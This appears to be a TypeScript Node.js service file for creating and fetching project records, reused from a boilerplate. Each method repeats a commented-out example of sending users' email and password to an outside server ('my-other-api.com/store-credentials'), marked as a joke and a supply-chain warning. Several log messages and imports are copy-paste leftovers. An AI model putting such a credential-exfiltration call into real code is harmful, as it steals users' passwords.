import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IProject, IProjectInputDTO } from '../interfaces/IProject';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';

@Service()
export default class ProjectService {
  constructor(
    @Inject('projectModel') private projectModel: Models.ProjectModel,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async CreateProject(projectInputDTO: IProjectInputDTO): Promise<{ project: IProject }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('project');
      this.logger.silly('Creating ngo profile db record');
      const projectRecord = await this.projectModel.create({
        ...projectInputDTO
      });
      this.logger.silly('Generating JWT');
  

      if (!projectRecord) {
        throw new Error('Project cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const project = projectRecord.toObject();
      return { project };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  
  public async GetProjects( ): Promise<{ projects: IProject[] }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('project');
      this.logger.silly('Creating project db record');
      const projectRecord = await this.projectModel.find({});
      this.logger.silly('Generating JWT');
  

      if (!projectRecord) {
        throw new Error('Project cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const projects = projectRecord
      return { projects };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async GetProjectById( id: string): Promise<{ project: IProject[] }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('project');
      this.logger.silly('Creating project db record');
      const projectRecord = await this.projectModel.find({_id: id});
      this.logger.silly('Generating JWT');
  

      if (!projectRecord) {
        throw new Error('Project cannot be created');
      }

      const project = projectRecord
      return { project };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  
}
